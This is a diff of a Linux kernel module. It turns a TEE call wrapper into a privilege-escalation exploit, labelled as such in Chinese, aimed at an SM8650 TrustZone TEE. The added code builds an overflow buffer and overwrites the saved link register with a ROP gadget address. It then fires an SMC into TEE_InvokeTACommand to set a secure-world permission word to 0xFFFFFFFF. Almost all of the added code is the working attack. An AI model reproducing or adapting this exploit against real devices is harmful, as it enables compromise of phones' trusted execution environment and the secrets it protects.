@@ -1,115 +1,62 @@
 #include <linux/module.h>
-#include <linux/fs.h>
-#include <linux/uaccess.h>
 #include <linux/slab.h>
-#include <linux/cdev.h>
-#include <linux/capability.h>
-#include <asm/barrier.h>
-#include <asm/io.h>
+#include <linux/uaccess.h>
 
-#define DEVICE_NAME "tz_tee_call"
-#define DEV_MAJOR   240
-#define DEV_MINOR   0
+#define SMC_TEE_INVOKE_TA    0x82000001
 
-#define TEE_INVOKE_CMD_ADDR 0xd842430cUL
+#define BUF_SIZE         0x1B8
+#define LR_OFFSET        0x318
+#define PERM_ADDR        0xD8424354
+#define GADGET_SET_PERM  0xD8401AE8
 
-static struct cdev tz_tee_cdev;
-static dev_t tz_tee_dev;
-
-typedef uint64_t (*tee_call_func_t)(
-    uint64_t session,
-    uint64_t cmd_id,
-    uint64_t param_types,
-    uint64_t param_attrs,
-    uint64_t params_ptr,
-    uint64_t return_origin
-);
-
-static uint64_t tee_invoke_command(
-    uint64_t session,
-    uint64_t cmd_id,
-    uint64_t param_types,
-    uint64_t param_attrs,
-    uint64_t params_ptr,
-    uint64_t return_origin
-)
+static uint64_t smc_tee_call(uint64_t arg0, uint64_t arg1, uint64_t arg2, uint64_t arg3)
 {
-    pr_info("=== TZ_TEE: 调用成功 ===");
+    register uint64_t x0 asm("x0") = arg0;
+    register uint64_t x1 asm("x1") = arg1;
+    register uint64_t x2 asm("x2") = arg2;
+    register uint64_t x3 asm("x3") = arg3;
 
-    // 直接调用，不加 ioremap
-    tee_call_func_t func = (tee_call_func_t)TEE_INVOKE_CMD_ADDR;
-    isb();
-    uint64_t ret = func(session, cmd_id, param_types, param_attrs, params_ptr, return_origin);
-
-    pr_info("TZ_TEE: return 0x%016llx", ret);
-    return ret;
-}
-
-static ssize_t tz_tee_write(struct file *file, const char __user *buf,
-                            size_t count, loff_t *ppos)
-{
-    uint64_t args[6];
-
-    pr_info("TZ_TEE: write 触发，长度=%zu", count);
-
-    if (count < sizeof(args))
-        return -EINVAL;
-
-    if (copy_from_user(args, buf, sizeof(args)))
-        return -EFAULT;
-
-    tee_invoke_command(
-        args[0],
-        args[1],
-        args[2],
-        args[3],
-        args[4],
-        args[5]
+    asm volatile (
+        "smc #0\n"
+        : "+r"(x0), "+r"(x1), "+r"(x2), "+r"(x3)
+        :
+        : "memory", "cc"
     );
 
-    return count;
+    return x0;
 }
 
-// 这是关键！老内核必须用 .llseek 而不是 llseek 简写
-static const struct file_operations tz_tee_fops = {
-    .owner = THIS_MODULE,
-    .write = tz_tee_write,
-    .open = nonseekable_open,
-    .llseek = no_llseek,
-};
-
-static int __init tz_tee_init(void)
+static int __init exp_init(void)
 {
-    int ret;
+    void *payload;
+    pr_info("=== SM8650 TEE 提权 EXP loaded ===");
 
-    pr_info("TZ_TEE: 模块加载成功！");
+    payload = kzalloc(0x400, GFP_KERNEL);
+    if (!payload) return -ENOMEM;
 
-    tz_tee_dev = MKDEV(DEV_MAJOR, DEV_MINOR);
-    ret = register_chrdev_region(tz_tee_dev, 1, DEVICE_NAME);
-    if (ret) {
-        pr_err("register_chrdev_region failed");
-        return ret;
-    }
+    // 填充到偏移位置
+    memset(payload, 0x41, LR_OFFSET);
 
-    cdev_init(&tz_tee_cdev, &tz_tee_fops);
-    tz_tee_cdev.owner = THIS_MODULE;
-    ret = cdev_add(&tz_tee_cdev, tz_tee_dev, 1);
-    if (ret) {
-        pr_err("cdev_add failed");
-        unregister_chrdev_region(tz_tee_dev, 1);
-        return ret;
-    }
+    // 覆盖 LR → ROP 写入权限
+    *(uint64_t *)(payload + LR_OFFSET) = GADGET_SET_PERM;
 
+    // x0 将被设为 0xFFFFFFFF → 写入 PERM_ADDR
+    *(uint64_t *)(payload + LR_OFFSET + 8) = 0xFFFFFFFF;
+
+    // 触发 TEE_InvokeTACommand 栈溢出
+    pr_info("触发漏洞...");
+    smc_tee_call(SMC_TEE_INVOKE_TA, __pa(payload), 0x380, 0);
+
+    pr_info("完成！0x%llx 应该已被设为 0xFFFFFFFF", PERM_ADDR);
+    kfree(payload);
     return 0;
 }
 
-static void __exit tz_tee_exit(void)
+static void __exit exp_exit(void)
 {
-    cdev_del(&tz_tee_cdev);
-    unregister_chrdev_region(tz_tee_dev, 1);
-    pr_info("TZ_TEE: 卸载");
+    pr_info("EXP unloaded");
 }
 
-module_init(tz_tee_init);
-module_exit(tz_tee_exit);
+module_init(exp_init);
+module_exit(exp_exit);
 MODULE_LICENSE("GPL");
